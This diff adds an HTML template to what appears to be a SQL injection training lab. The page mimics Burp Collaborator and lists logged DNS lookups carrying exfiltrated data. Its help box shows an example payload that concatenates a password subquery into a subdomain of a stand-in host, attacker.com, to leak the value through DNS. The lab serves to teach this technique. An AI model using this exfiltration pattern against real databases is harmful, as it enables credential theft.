@@ -1,0 +1,50 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="container py-4">
+    <h2 class="mb-4 text-warning"><i class="bi bi-router"></i> DNS/HTTP Interaction Logs</h2>
+    <p>This panel simulates the <strong>Burp Collaborator</strong> interface.</p>
+    
+    <div class="table-responsive shadow-sm">
+        <table class="table table-hover border">
+            <thead class="bg-dark text-white">
+                <tr>
+                    <th>Time</th>
+                    <th>Simulated Request URL</th>
+                    <th>Exfiltrated Data (Subdomain)</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for log in logs %}
+                <tr>
+                    <td>{{ log.time }}</td>
+                    <td class="font-monospace">{{ log.raw_url }}</td>
+                    <td class="fw-bold text-danger">{{ log.exfiltrated_data }}</td>
+                </tr>
+                {% else %}
+                <tr>
+                    <td colspan="3" class="text-center text-muted py-5">
+                        No interactions received.<br>
+                        <em>Inject a payload that triggers a DNS lookup to see data here.</em>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    
+    <div class="mt-4 alert alert-light border">
+        <h5>How to read this?</h5>
+        <p class="mb-0">
+            If you injected <code>http://' || (SELECT password...) || '.attacker.com</code>,<br>
+            the database executes the subquery, gets <code>hz49...</code>, and tries to contact <code>http://hz49....attacker.com</code>.<br>
+            The subdomain <strong>IS</strong> the password.
+        </p>
+    </div>
+
+    <div class="text-center mt-3">
+        <a href="/" class="btn btn-secondary">Back to Lab</a>
+        <a href="/logs" class="btn btn-outline-dark">Refresh</a>
+    </div>
+</div>
+{% endblock %}
